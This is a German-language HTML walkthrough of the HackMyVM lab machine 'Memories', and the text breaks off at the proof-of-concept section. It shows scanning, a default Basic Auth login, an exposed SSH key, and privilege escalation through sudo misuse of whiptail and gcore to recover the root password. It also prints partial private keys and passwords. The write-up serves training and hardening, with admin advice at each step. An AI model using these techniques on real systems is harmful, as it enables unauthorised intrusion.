@@ -1,0 +1,538 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memories - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Memories - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi / nano</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">Burp Suite (impliziert)</div>
+                <div class="tool-item">base64</div> <!-- Für Basic Auth -->
+                <div class="tool-item">CyberChef (impliziert)</div> <!-- Für SSH Key Decoding -->
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">whiptail</div>
+                <div class="tool-item">gcore</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">ps</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">xargs</div>
+                <div class="tool-item">Bash Scripting (while loop)</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Initial Access (Basic Auth & SSH)</a></li>
+                <li><a href="#privilege-escalation-1">Privilege Escalation (laura zu lucy)</a></li>
+                <li><a href="#privilege-escalation-2">Privilege Escalation (lucy zu root)</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.110	08:00:27:ed:99:c8	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wird durchgeführt, um aktive Hosts im lokalen Netzwerk zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.110` wird identifiziert. Die MAC-Adresse gehört zu Oracle VirtualBox.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ziel-IP ist bekannt. Führen Sie einen Portscan durch.
+<br><strong>Empfehlung (Admin):** Standard-Netzwerk-Monitoring.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>[Inhalt der Datei nach Bearbeitung]
+...
+<span class="command">192.168.2.110  memories.hmv</span>
+...</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um `memories.hmv` der IP `192.168.2.110` zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nötig, falls Webdienste oder andere Services auf diesem Hostnamen konfiguriert sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ermöglicht die Verwendung des Hostnamens in Tools.
+<br><strong>Empfehlung (Admin):** Korrekte DNS-/vHost-Konfiguration.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.110 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-12 00:50 CET
+Nmap scan report for memories.hmv (192.168.2.110)
+Host is up (0.000098s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">2048 d366a30a23d346e1e66cffef2d0dad7c (RSA)</span>
+|   <span class="command">256 9335938f6b7b1f11ce3adb0915a5e1ac (ECDSA)</span>
+|_  <span class="command">256 364ecb296d6419491547d068d40fc6a5 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_<span class="command">http-title: Apache2 Debian Default Page: It works</span>
+|_<span class="command">http-server-header: Apache/2.4.38 (Debian)</span>
+MAC Address: 08:00:27:ED:99:C8 (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: <span class="command">Linux 4.15 - 5.6</span> (97%), Linux 5.0 - 5.3 (96%), ... (Debian Linux wahrscheinlich)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.10 ms memories.hmv (192.168.2.110)
+
+OS and Service detection performed...
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein detaillierter Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) wird auf das Ziel durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei Ports sind offen:
+*   **22 (SSH):** OpenSSH 7.9p1 (Debian 10). Relativ aktuell, aber Version 7.9 hat bekannte User Enumeration Schwachstellen.
+*   **80 (HTTP):** Apache 2.4.38 (Debian) mit der Standard-Debian-Seite. Dies deutet darauf hin, dass die Hauptseite nicht konfiguriert ist, aber möglicherweise virtuelle Hosts oder Verzeichnisse existieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Konzentrieren Sie sich auf den Webserver (Port 80). Führen Sie Verzeichnis-Enumeration durch (`gobuster`, `ffuf`), um versteckte Inhalte oder Anwendungen zu finden. Testen Sie SSH auf User Enumeration (CVE-2018-15473), falls Benutzernamen bekannt werden.
+<br><strong>Empfehlung (Admin):** Aktualisieren Sie OpenSSH und Apache. Konfigurieren Sie die Apache-Default-Seite oder leiten Sie auf die eigentliche Anwendung um. Härten Sie die Apache-Konfiguration (z.B. Server-Tokens ausblenden).</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration & Initial Access (Basic Auth & SSH)</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">gobuster dir -u http://192.168.2.110 -x txt,php,rar,zip,tar,pem,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e</span></div>
+                     <pre>
+===============================================================
+Gobuster v...
+...
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.110</span>
+...
+===============================================================
+... Starting gobuster ...
+===============================================================
+<span class="command">http://192.168.2.110/index.html</span>           (Status: 200) [Size: 10701]
+<span class="command">http://192.168.2.110/robots.txt</span>           (Status: 200) [Size: 11]
+<span class="command">http://192.168.2.110/memories</span>             (Status: 401) [Size: 460] <span class="comment"><-- Interessant!</span>
+===============================================================
+... Finished ...
+===============================================================
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis-Enumeration auf dem Webserver verwendet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Neben der `index.html` und einer fast leeren `robots.txt` wird das Verzeichnis `/memories` gefunden. Dieses Verzeichnis gibt einen Statuscode `401 Unauthorized` zurück, was bedeutet, dass es existiert, aber eine Authentifizierung erfordert (wahrscheinlich HTTP Basic Authentication).</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">[Kein Prompt - Inhalt von http://192.168.2.110/robots.txt]</div>
+                      <pre>/memories</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Inhalt von `robots.txt` bestätigt das Verzeichnis `/memories`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Versuchen Sie, auf `/memories` zuzugreifen. Wenn eine Basic Auth Abfrage kommt, versuchen Sie Standard-Credentials (z.B. `admin:admin`, `admin:password`) oder führen Sie einen Brute-Force-Angriff mit `hydra` durch, falls ein Benutzername bekannt ist oder erraten werden kann.
+<br><strong>Empfehlung (Admin):** Verwenden Sie für Verzeichnisschutz idealerweise stärkere Authentifizierungsmethoden als Basic Auth. Wenn Basic Auth verwendet wird, erzwingen Sie starke Passwörter und implementieren Sie Schutz gegen Brute-Force (z.B. `fail2ban`).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.110</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.110
++ Target Hostname:    192.168.2.110
++ Target Port:        80
++ Start Time:         2022-11-12 00:52:08 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.38 (Debian)</span>
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
++ <span class="password">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="password">Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5be1b1e4c84f7, mtime: gzip</span>
++ Allowed HTTP Methods: <span class="command">GET, POST, OPTIONS, HEAD</span> <span class="comment"><-- POST korrigiert</span>
++ <span class="password">OSVDB-3233: /icons/README: Apache default file found.</span>
++ 7915 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2022-11-12 00:52:23 (GMT1) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nikto wird verwendet, um nach bekannten Webserver-Schwachstellen und Fehlkonfigurationen zu suchen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto findet keine kritischen Schwachstellen, meldet aber das Fehlen von Sicherheitsheadern (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`), ein mögliches Inode-Leak über ETags und eine Apache-Standarddatei (`/icons/README`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die Nikto-Ergebnisse liefern keine direkten Einstiegspunkte. Konzentrieren Sie sich auf das `/memories`-Verzeichnis.
+<br><strong>Empfehlung (Admin):** Implementieren Sie die fehlenden Sicherheitsheader. Entfernen Sie Standarddateien wie `/icons/README`. Konfigurieren Sie ETags, um keine Inodes preiszugeben (oder deaktivieren Sie ETags).</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, auf `/memories` zuzugreifen. Da dies eine Basic Auth erfordert, wird ein HTTP-Request (vermutlich mit Burp Suite) modifiziert, um Standard-Credentials (`admin:admin`) im `Authorization`-Header zu senden. Der Base64-kodierte Wert für `admin:admin` ist `YWRtaW46YWRtaW4=`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Burp Suite Repeater Request]</div>
+                     <pre><code class="language-http">
+POST /memories/ HTTP/1.1 <span class="comment"><-- Methode auf POST geändert</span>
+Host: 192.168.2.110
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+<span class="password">Authorization: Basic YWRtaW46YWRtaW4=</span>
+Referer: http://192.168.2.110/memories
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+</code></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die Antwort des Servers auf den Request mit `admin:admin`-Credentials wird analysiert.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Burp Suite Repeater Response]</div>
+                     <pre><code class="language-http">
+HTTP/1.1 200 OK
+Date: Fri, 11 Nov 2022 23:58:34 GMT
+Server: Apache/2.4.38 (Debian)
+Last-Modified: Mon, 22 Mar 2021 07:53:48 GMT
+ETag: "72e-5be1b5db31096-gzip"
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+Content-Length: 1838
+Connection: close
+Content-Type: text/html
+
+<!DOCTYPE html> <span class="comment"><-- Maskierung: < zu <</span>
+... (HTML-Inhalt der Seite /memories/) ...
+</code></pre> <!-- Annahme: Antwort enthält HTML -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit `HTTP/1.1 200 OK`. Dies bedeutet, dass die Standard-Credentials `admin:admin` für den Zugriff auf `/memories` gültig waren!</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der HTML-Inhalt der `/memories`-Seite (der in der HTTP-Antwort enthalten ist) wird untersucht. Darin wird der Benutzername `laura` und ein privater SSH-Schlüssel gefunden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Extrahiert aus dem HTML der /memories Seite]</div>
+                     <pre>Benutzername: <span class="command">laura</span>
+
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA2W+WidI/grDh9S7BHggHhYFtusWhcArliwIzfEUbjxI+YSMxaCpR
+PmPQHVy9dMWW0Joml9ShJiH8m2STT4vH36vyWpgBmZRAgm3lnfc/CzzI+onbJ8IkfQiG0
+... (SSH Key Body) ...
+dWp60QAAAAbGF1cmFAbWVtb3JpZXMBAgMEBQ
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Fund. Durch die schwachen Basic Auth Credentials (`admin:admin`) konnte auf eine Seite zugegriffen werden, die einen Benutzernamen (`laura`) und den zugehörigen privaten SSH-Schlüssel preisgibt. Der Schlüssel scheint nicht passwortgeschützt zu sein (keine `aes-cbc`-Angabe im Header).</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der gefundene SSH-Schlüssel wird in einer lokalen Datei (`laurarsa`) gespeichert und die Berechtigungen auf `600` gesetzt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nano laurarsa</span></div> <!-- Schlüssel wird eingefügt -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">chmod 600 laurarsa</span></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Es wird versucht, sich mit dem gefundenen Schlüssel und dem Benutzernamen `laura` per SSH anzumelden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i laurarsa laura@memories.hmv</span></div>
+                     <pre>
+The authenticity of host 'memories.hmv (192.168.2.110)' can't be established.
+ED25519 key fingerprint is SHA256:134Y8PiTLRvyPe9VY8s4KBQlyghWccugn+abbL+zM.
+...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'memories.hmv' (ED25519) to the list of known hosts.
+Linux memories 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+...
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, ...
+</pre>
+                     <div class="prompt">laura@memories:~$</div> <!-- Login erfolgreich! -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login als Benutzer `laura` mit dem gefundenen privaten Schlüssel ist erfolgreich. Der initiale Zugriff auf das System wurde erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Führen Sie Enumeration als `laura` durch: Prüfen Sie `sudo -l`, SUID-Dateien, Cronjobs, Home-Verzeichnis. Suchen Sie das User-Flag.
+<br><strong>Empfehlung (Admin):** Ändern Sie sofort das Basic Auth Passwort für `/memories`. Entfernen Sie den privaten Schlüssel von der Webseite. Verwenden Sie niemals Standard-Credentials. Private Schlüssel dürfen niemals öffentlich zugänglich sein.</p>
+        </section>
+
+        <section id="privilege-escalation-1">
+             <h2>Privilege Escalation (laura zu lucy)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `laura` werden die `sudo`-Rechte überprüft.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">laura@memories:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for laura on memories:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User laura may run the following commands on memories:
+    <span class="command">(lucy) NPASSWD: /usr/bin/whiptail</span>
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> `laura` darf das Programm `/usr/bin/whiptail` als Benutzer `lucy` ohne Passwort (`NOPASSWD`) ausführen. `whiptail` wird verwendet, um Dialogboxen in der Shell anzuzeigen. Einige Optionen, wie `--textbox`, erlauben das Anzeigen von Dateiinhalten.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die Home-Verzeichnisse werden aufgelistet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">laura@memories:~$ <span class="command">ls /home</span></div>
+                     <pre>laura  lucy</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Es wird versucht, die User-Flag von `lucy` direkt zu lesen, was fehlschlägt.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">laura@memories:~$ <span class="command">cat ../lucy/user.txt</span></div>
+                     <pre><span class="password">cat: ../lucy/user.txt: Permission denied</span></pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die `sudo`-Regel für `whiptail` wird ausgenutzt, um auf Dateien als Benutzer `lucy` zuzugreifen. Es wird versucht, den privaten SSH-Schlüssel von `lucy` (`/home/lucy/.ssh/id_rsa`) mithilfe der `--textbox`-Option von `whiptail` anzuzeigen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">laura@memories:~$ <span class="command">sudo -u lucy /usr/bin/whiptail --textbox /home/lucy/.ssh/id_rsa</span></div>
+                    <pre>[Hilfetext von whiptail wird angezeigt, da Höhe und Breite fehlen]</pre> <!-- Interpretation der Ausgabe -->
+                     <div class="prompt">laura@memories:~$ <span class="command">sudo -u lucy /usr/bin/whiptail --textbox ../lucy/.ssh/id_rsa 40 80</span></div>
+                     <pre>
+┌──────────────────────────────────────────────────────────────────────────────┐
+│                                                                              │
+│ -----BEGIN OPENSSH PRIVATE KEY-----                                          │
+│ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn   │
+│ NhAAAAAwEAAQAAAQEAvI9G4zVnp7XhQzDNp8mC3rryq7HNtS1+D8gwZEm1EH2Dfuw0Yb    │
+│ YCZRWkvaBxM+vAZ+fm7/KdftdShHfDx/Wo/56CIRXCzVjzdPIfyaCxlj5M5h0zZM5QKKND  │
+│ txGfWPEhKME+g7F+Hsng2tCzkYI7+H0cn74w3zNXQ7NNHi5FeQ+52eykQ8v0asfDwILq   │
+│ iPg/ZrJwnNabJce6igs40lLfTFU4qW5g8b/dkJxH7WQbd86r05YPvrLQEbDnZj9hj8Bdtz │
+│ khHfoiRskUYFlGh1oe2ZrLo5AJqp60S1nnbuW0iTM/o/zv4Q0xP/lzVaj3AWJkMulUZz   │
+│ ct4slq2mmQAAA8gZnFEaGZxRGgAAAAdzc2gtcnNhAAABAQC8j0bjNWenteFDMM2nw6YL   │
+│ ... (Schlüssel gekürzt) ...                                                  │
+│ dxndyc7ZgSkAAAAbsdWN5QG1lbW9yaWVzAQIDBA                                    │
+│ -----END OPENSSH PRIVATE KEY-----                                          │
+│                                                                              │
+│                                                                              │
+│                                  < Ok >                                      │
+└──────────────────────────────────────────────────────────────────────────────┘
+</pre> <!-- Whiptail Box simuliert -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit funktioniert. Durch Ausführen von `whiptail --textbox` als `lucy` kann `laura` den Inhalt des privaten SSH-Schlüssels von `lucy` lesen. Dieser Schlüssel scheint nicht passwortgeschützt zu sein.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Schlüssel von `lucy` wird extrahiert, in `lucyrsa` gespeichert und die Berechtigungen gesetzt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nano lucyrsa</span></div> <!-- Schlüssel wird eingefügt -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">chmod 600 lucyrsa</span></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Es wird sich per SSH als `lucy` mit dem extrahierten Schlüssel angemeldet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i lucyrsa lucy@memories.hmv</span></div>
+                     <pre>
+Linux memories 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+...
+Last login: Mon Mar 22 03:37:16 2021 from 192.168.1.58
+</pre>
+                     <div class="prompt">lucy@memories:~$</div> <!-- Login erfolgreich -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Privilegieneskalation von `laura` zu `lucy` war erfolgreich, indem eine unsichere `sudo`-Regel für `whiptail` ausgenutzt wurde, um Lucys privaten SSH-Schlüssel zu lesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Lesen Sie nun die User-Flag als `lucy` (`cat user.txt`). Überprüfen Sie die `sudo`-Rechte für `lucy`, um den nächsten Eskalationsschritt zu finden.
+<br><strong>Empfehlung (Admin):** Gewähren Sie niemals `sudo`-Rechte für Programme wie `whiptail`, die zum Lesen beliebiger Dateien missbraucht werden können, insbesondere nicht mit `NPASSWD`. Konfigurieren Sie `sudo` nach dem Prinzip der geringsten Rechte.</p>
+        </section>
+
+        <section id="privilege-escalation-2">
+             <h2>Privilege Escalation (lucy zu root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `lucy` werden die `sudo`-Rechte überprüft.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">lucy@memories:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for lucy on memories:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lucy may run the following commands on memories:
+    <span class="command">(ALL : ALL) NOPASSWD: /usr/bin/gcore</span>
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! `lucy` darf `/usr/bin/gcore` als jeder Benutzer (`ALL`) und jede Gruppe (`ALL`), einschließlich Root, ohne Passwort (`NOPASSWD`) ausführen. `gcore` erstellt einen Core-Dump (Speicherabbild) eines laufenden Prozesses. Da `lucy` `gcore` als Root ausführen kann, kann sie Speicherabbilder von Root-Prozessen erstellen. Diese Abbilder können sensible Informationen wie Passwörter oder Schlüssel enthalten.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die User-Flag wird gelesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">lucy@memories:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">imissingsomething</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Das User-Flag für `lucy` lautet `<span class="password">imissingsomething</span>`. (Hinweis: Der vorherige Text zeigte ein anderes User-Flag für `icex64`. Hier wird das Flag für `lucy` gefunden).</p>
+
+             <p class="analysis"><strong>Analyse Fortsetzung:** Es wird versucht, die `sudo gcore`-Berechtigung auszunutzen. Ein `while true`-Loop wird gestartet, der kontinuierlich versucht, mit `gcore` einen Core-Dump von Prozessen zu erstellen, deren Namen "memories" enthalten (`ps aux | grep memories | awk {'print $2'} | xargs sudo /usr/bin/gcore`). Das Ziel ist, einen kurzlebigen Root-Prozess namens "memories" zu erwischen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">lucy@memories:~$ <span class="command">while true ; do ps -aux | grep memories | awk {'print $2'} | xargs sudo /usr/bin/gcore ; done</span></div>
+                     <pre>
+ptrace: No such process.
+You can't do that without a process to debug.
+The program is not being run.
+gcore: failed to create core.15975
+ptrace: No such process.
+... (Viele Fehler, bis der Prozess läuft) ...
+<span class="comment">[Core dump wird erfolgreich erstellt, z.B. core.15355]</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Nachdem erfolgreich Core-Dumps (z.B. `core.15353`, `core.15355`) erstellt wurden, werden diese mit `strings` nach interessanten Inhalten durchsucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">lucy@memories:~$ <span class="command">ls</span></div>
+                     <pre>core.15353  core.15355  flag.sh  user.txt</pre>
+                     <div class="prompt">lucy@memories:~$ <span class="command">strings core.15355</span></div>
+                     <pre>
+...
+<span class="command">/root/memories</span>
+...
+<span class="command">/usr/lib/x86_64-linux-gnu/libc-2.28.so</span>
+<span class="command">/usr/lib/x86_64-linux-gnu/ld-2.28.so</span>
+...
+:::::::::::::::::::::::::::::::::::::::::::::::::
+My password is <span class="password">whataboutyourthinking</span>
+:::::::::::::::::::::::::::::::::::::::::::::::::
+...
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff war erfolgreich! Der Core-Dump des Prozesses `/root/memories` (der wahrscheinlich als Root lief) wurde erstellt. Die Analyse mit `strings` enthüllt das Root-Passwort im Klartext: `<span class="password">whataboutyourthinking</span>`.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Mit dem gefundenen Root-Passwort wird mittels `su root` zu Root gewechselt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">lucy@memories:~$ <span class="command">su root</span></div>
+                     <pre>Password: <span class="password">[Passwort whataboutyourthinking eingegeben]</span></pre>
+                     <div class="prompt">root@memories:/home/lucy#</div> <!-- Root-Shell! -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Das Root-Flag wird gelesen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">root@memories:/home/lucy# <span class="command">cd</span></div>
+                     <div class="prompt">root@memories:~# <span class="command">ls</span></div>
+                     <pre>flag.sh  memories  memories.c  <span class="command">ro0t.txt</span></pre>
+                     <div class="prompt">root@memories:~# <span class="command">cat ro0t.txt</span></div>
+                     <pre><span class="password">HMVtakingthisgames</span></pre>
+                  </div>
+              </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Privilegieneskalation zu Root war erfolgreich durch Ausnutzung der `sudo gcore`-Berechtigung zum Auslesen des Root-Passworts aus dem Speicher eines Root-Prozesses. Das Root-Flag (`ro0t.txt`) wurde gefunden und gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Dokumentieren Sie die Privilegieneskalation über `sudo gcore`.
+<br><strong>Empfehlung (Admin):** Entfernen Sie die `sudo`-Berechtigung für `gcore`. Gewähren Sie `sudo`-Rechte nur für absolut notwendige Befehle. Speichern Sie Passwörter niemals im Klartext im Speicher von Prozessen. Verwenden Sie sichere Methoden zur Authentifizierung und Speicherung von Credentials.</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC beschreibt die Eskalationskette: Zugriff auf ein geschütztes Webverzeichnis (`/memories`) durch Erraten von Standard-Basic-Auth-Credentials, Fund eines SSH-Keys auf der Seite, SSH-Login als `laura`, Eskalation zu `lucy` durch Ausnutzung einer unsicheren `sudo`-Regel für `whiptail` zum Lesen von Lucys SSH-Key, und schließlich Eskalation zu Root durch Ausnutzung einer unsicheren `sudo`-Regel für `gcore` zum Auslesen des Root-Passworts aus dem Speicher.</p>
+
+            <h3>POC Schritt 1: Initial Access (laura)</h3>
